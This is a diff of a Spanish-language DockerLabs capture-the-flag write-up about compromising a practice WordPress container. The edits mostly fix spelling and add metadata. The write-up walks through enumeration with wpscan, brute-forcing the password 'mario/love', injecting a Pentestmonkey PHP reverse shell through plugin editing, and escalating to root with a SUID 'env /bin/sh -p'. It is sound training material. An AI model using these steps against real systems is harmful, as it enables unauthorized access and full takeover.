@@ -2,14 +2,36 @@
 Estado: Completado
 Plataforma: DockerLabs
 SO: Linux
-Dificultad: Facil
+Dificultad: Fácil
 VectorInicial: WordPress login + plugin edit RCE
+ServicioInicial: HTTP
+PuertoInicial: 80
+Credenciales:
+ - mario: love
+Usuarios:
+ - mario
+ - www-data
+ - root
 Privesc: SUID env
+Tecnicas:
+ - Service Enumeration
+ - Directory Enumeration
+ - WordPress Enumeration
+ - Password Brute Force
+ - Authenticated RCE
+ - Reverse Shell
+ - SUID Abuse
+ - Privilege Escalation
+Herramientas:
+ - gomap
+ - dirb
+ - wpscan
+ - penelope
 Fecha: 2026-02-16
 ---
 <img width="911" height="510" alt="Pasted image 20260216150558" src="https://github.com/user-attachments/assets/7a2d1195-dd1e-40d0-aa99-65f15b273945" />
 
-Para empezar realizaremos un reconocimiento para ver que podemos encontrar.
+Para empezar realizaremos un reconocimiento para ver qué podemos encontrar.
 
 ```bash
  settarget 172.17.0.2                                              
@@ -55,9 +77,9 @@ GENERATED WORDS: 4612
 <snip>
 ```
 
-Estamos frente a un Wordpress en una carpeta distinta al raíz, así que vamos a explorar la web a ver si encontramos algo interesante.
+Estamos frente a un WordPress en una carpeta distinta de la raíz, así que vamos a explorar la web a ver si encontramos algo interesante.
 
-Solo encontramos en una publicación el usuario **mario** así que usaremos una herramienta para ver si encontramos mas información.
+Solo encontramos en una publicación el usuario **mario**, así que usaremos una herramienta para ver si encontramos más información.
 
 ```bash
  wpscan --url http://$TARGET/wordpress/ -e u,p --plugins-detection aggressive
@@ -149,7 +171,7 @@ Interesting Finding(s):
  <snip>
 ```
 
-En tema de usuarios vemos que solo existe el mismo que encontramos antes, **mario**, pero si vemos que hay un pluging vulnerable llamado ***theme-editor***.
+En cuanto a usuarios, vemos que solo existe el mismo que encontramos antes, **mario**, pero también vemos que hay un plugin vulnerable llamado **theme-editor**.
 
 Pero intentaremos encontrar primero el acceso del usuario *mario*.
 
@@ -180,13 +202,13 @@ Trying mario / love Time: 00:00:03 <
 <snip>
 ```
 
-Con estos datos entraremos al panel de control de Wordpress.
+Con estos datos entraremos al panel de control de WordPress.
 
-Una vez dentro nos dirigiremos al plugin vulnerable que encontramos antes para inyectar código y conseguir una revershell.
+Una vez dentro, nos dirigiremos al plugin vulnerable que encontramos antes para inyectar código y conseguir una reverse shell.
 
 <img width="1899" height="857" alt="Pasted image 20260216160309" src="https://github.com/user-attachments/assets/fed97b08-559b-45aa-bda4-d053a5057e63" />
 
-Usaremos el código PHP de Pentestmonkey's reverse shell y nos pondremos a la escucha.
+Usaremos el código PHP de la reverse shell de Pentestmonkey y nos pondremos a la escucha.
 
 ```bash
  penelope -p 443    
@@ -206,7 +228,7 @@ Usaremos el código PHP de Pentestmonkey's reverse shell y nos pondremos a la es
 www-data@cf97ec34ece9:/$ 
 ```
 
-Ya estamos dentro de la maquina, ahora solo nos queda aumentar nuestros privilegios.
+Ya estamos dentro de la máquina; ahora solo nos queda aumentar nuestros privilegios.
 
 ```bash
 www-data@cf97ec34ece9:/$ find / -perm -4000 2>/dev/null
@@ -221,7 +243,7 @@ www-data@cf97ec34ece9:/$ find / -perm -4000 2>/dev/null
 /usr/bin/chfn
 ```
 
-En este caso encontramos un **SUID** para **env**, así que buscaremos en la web de GTFOBINS la forma de usarlo para convertirnos en *root*
+En este caso encontramos un **SUID** para **env**, así que buscaremos en la web de GTFOBins la forma de usarlo para convertirnos en `root`.
 
 ```bash
 www-data@cf97ec34ece9:/$ env /bin/sh -p
@@ -229,10 +251,10 @@ www-data@cf97ec34ece9:/$ env /bin/sh -p
 root
 ```
 
-Y con este ultimo paso ya somos administradores del sistema.
+Y con este último paso ya somos administradores del sistema.
 
 Aunque el plugin theme-editor presenta vulnerabilidades conocidas, en este caso no fue necesario explotarlas directamente, ya que conseguimos acceso como administrador mediante credenciales débiles y pudimos modificar el código del plugin para obtener ejecución remota de comandos.
 
 ---
-Si te gusto puedes invitarme a un cafe.
+Si te gustó, puedes invitarme a un café.
 [![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/C0C61UHTB1)
